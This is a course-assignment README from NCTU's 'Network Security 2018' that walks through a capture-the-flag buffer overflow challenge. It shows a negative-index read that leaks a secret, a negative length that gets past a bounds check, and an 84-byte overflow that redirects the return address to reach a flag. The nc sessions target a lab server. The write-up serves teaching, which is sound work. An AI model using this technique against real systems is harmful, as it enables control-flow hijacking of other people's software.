# Buffer Overflow Attack in Simulation

This project will introduce you to control-flow hijacking vulnerabilities in application software, including buffer overflows.
* Be able to identify and avoid buffer overflow vulnerabilities in native code.
* Understand the severity of buffer overflows and the necessity of standard defenses.
* Gain familiarity with machine architecture and assembly language.

> **NOTCIE:** This repository is the assignment in NCTU course "Network Security 2018". If you are taking this course, please do not duplicate from this repository. All rights reserved.

---
## Description

This project will introduce you to control-flow hijacking vulnerabilities in application software, including buffer overflows. We have provided source code, binary executable, and the assembly code. Try to find vulnerability in these files and exploit it to get the secret flag. There are two flags: `flag1` & `flag2`. If you get `flag1`, you will score 100, `flag2` is just the bonus flag. Have fun!

---
## Solutions

1. Before starting, we should try to use the serve and observe vulnerabilities
    ```
    # Connect to the server 140.113.194.66:8787
    $ nc 140.113.194.66 8787
    ----------------------
            NS
    ----------------------
    1. View info
    2. Edit info
    3. Exit
    ----------------------
    Your choice:
    ```
    * In the program `proj3.c`, the main function will call function `func`.
        * In the function `func`, the variable `ret_addr` will store the return address of its function. This could be a key point to attack this program.
        * In the function `func`, we can see there is a switch-case a while loop and the third of case is going to compare `ret_addr` with variables `magic1` and `magic2` to decide which function to return.
    * Observe with the program `proj3.asm`.
        * The variable `ret_addr` in the `proj3.c` is store at `ebp-0x88` (line 688).
        * Above the declaration of `ret_addr` in the `proj3.c`, there is a variable `secret` with struct type `SEC`, which size is 32 bytes due to the operation system is 32-bits in the memory stack.
        * To explain the above mentioned, the struct of `SEC` include an array `info` with 32 elements which is 32 Bytes. After converting to hexadecimal-based, the size will become `0x20` which is mapped to `ebp-0x64` (line 702).
        * After the array info in the struct `SEC`, there is a 4 bytes unsigned long variable called `secret` which is a random number. The only way to change the content of `secret` is in the while loop which is in the function func.
    * In the program `proj3.c`, the function `edit_note` with a pointer `s`  as parameter which type `STU` is a struct includes variable `name` (16 bytes), `note` (16 bytes), `stuid` (16 bytes), and `age` (4 bytes). The total sizes are 44 bytes.
        * In the program `proj3.asm`, we can observe that the memory stack pushes 88 bytes for two persons `s` started from `ebp-0x60`.
2. Start to attack by using buffer overflow
    * By using buffer overflow to attack the server, we need to find out the input place that can let us input some payload to make the returned address be wrong (e.g., we want to get the content of the variable `magic1`, so that we need to return to `magic1`’s address).
    * In the program `proj3.c`, the function `menu` is the place to input some payload.
        * After connecting to the server, we can choose `2` to enter the mode of edit info. Then, the server will ask to enter the `secret` and there exists a severe problem.
            ```
            # Connect to the server 140.113.194.66:8787
            $ nc 140.113.194.66 8787
            ----------------------
                    NS
            ----------------------
            1. View info
            2. Edit info
            3. Exit
            ----------------------
            Your choice: 2
            Please input secret first:
            ```
        * The problem is that the value of integer in C can be positive or negative value. By entering a negative value, we can get the content outside the array’s index.
        * The more important thing is that the `secret` is stored behind the array `s[0]`. So that we can get the content of `secret` by entering `-1` as id in the mode of view info.
            ```
            # Connect to the server 140.113.194.66:8787
            $ nc 140.113.194.66 8787
            ----------------------
                    NS
            ----------------------
            1. View info
            2. Edit info
            3. Exit 
            ----------------------
            Your choice: 1
            Please input id: -1
            Name: 1

            Note:
            Age: 2928863094
            ----------------------
                    NS
            ----------------------
            1. View info
            2. Edit info
            3. Exit
            ----------------------
            Your choice:
            ```
        * The value shows after age is the `secret`’s value (`2928863094`) because the address of `secret` is `ebp-0x60`. which is the top 4 bytes before `s[0]` from above 44 bytes. Notice that the `secret`’s value is a random number.
3. Enter into the edited mode
    * After entering into the edited mode, we can enter the `secret`’s value (`2928863094`) and choose one user arbitrarily.

        ```
        # Connect to the server 140.113.194.66:8787
        $ nc 140.113.194.66 8787
        ----------------------
                NS
        ----------------------
        1. View info
        2. Edit info
        3. Exit
        ----------------------
        Your choice: 1
        Please input id: -1
        Name: 1

        Note:
        Age: 2928863094
        ----------------------
                NS
        ----------------------
        1. View info
        2. Edit info
        3. Exit
        ----------------------
        Your choice: 2
        Please input secret first: 2928863094
        Please input id: 1
        Input new note length:
        ```

    * In the program `proj3.c`, we found that we still cannot get the returned address we want if we only enter a positive integer less than 16 (line 124). Therefore, we enter `-1` because `-1` is a largest number in 2-based complement system so that we can trace back to the top of address in memory stack.
    * After entering `-1`, we are at the address of `note` in the struct `STU`. In that there is a variable name (16 bytes) before note, we can get the address of `note` from `s[0]` be `ebp-0x50`. Thus, we need to push 84 bytes ($5 \times 16 + 4 = 84$) to get the returned address.
4. Get the `flag1`
    * Finally, we can find that `magic1` will cover the original address at `080489e0` so that we can get the `flag1` after choose `3` to exit. Notice that the address need to be written in format of little endian.
    ![](https://i.imgur.com/PDDjfHZ.png)

---
## File Description

* `proj3.c` - The program of server on `140.113.194.66:8787`
* `proj3.asm` - The assembly program of `proj3.c`
* `proj3.py` - The program using buffer overflow to attack
* `flag1.txt` - The content of `flag1`

---
## Execution

1. Execute the `main.py`
    ```bash
    # Make sure your current directory is in "src/"
    $ python proj3.py
    ```
    * If succeed, you will see the following result
        ```bash
        [+] Opening connection to 140.113.194.66 on port 8787: Done
        2928863094
        FLAG{G00D_J0b!}
        [*] Closed connection to 140.113.194.66 port 8787
        ```
2. Show the true plaintext
    ```bash
    # Make sure your current directory is in "out/"
    $ cat flag1.txt
    FLAG{G00D_J0b!}
    ```

---
## Contributor

> **NOTICE:** You can follow the contributing process [CONTRIBUTING.md](CONTRIBUTING.md) to join me. I am very welcome any issue!

* [David Lu](https://github.com/yungshenglu)

---
## License

> **NOTCIE:** This repository is the assignment in NCTU course "Network Security 2018". If you are taking this course, please do not duplicate from this repository. All rights reserved.

[GNU GENERAL PUBLIC LICENSE Version 3](LICENSE)
